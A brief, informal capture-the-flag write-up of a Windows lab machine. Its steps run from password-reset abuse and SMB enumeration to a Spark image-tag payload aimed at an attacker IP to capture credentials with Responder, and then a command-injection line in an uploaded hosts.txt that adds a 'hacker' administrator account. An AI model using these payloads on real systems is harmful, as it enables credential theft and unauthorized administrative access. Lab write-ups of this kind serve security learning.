we first saw the website it had ==reset== password button. it asked for pet name and in a picture on website

there was a girl with dog. we saw the name of the picture anad it was 2 names so we rested her password

and with the creds we got out 1st flag .

we did smb and we saw spark files on shared

so we dwlded `==spark== 2.8.3` it had a vuln that ==<img src=10.10.14.10/aa >==

on responder we get password

soÂ  we logged on winrm now we saw we are in group Account operator

we can change password for all except for Admin

so there was a ps1 file on running it we saw a dir and there was an error not found so we we upload hosst.txt file

and it was read it to update the admins password

we accessed brittney from smb and uploaded a hosts.txt file with payload

`; net user hacker hello!123 /add;net localgroup Administrators hacker /add`

and it updated admins password
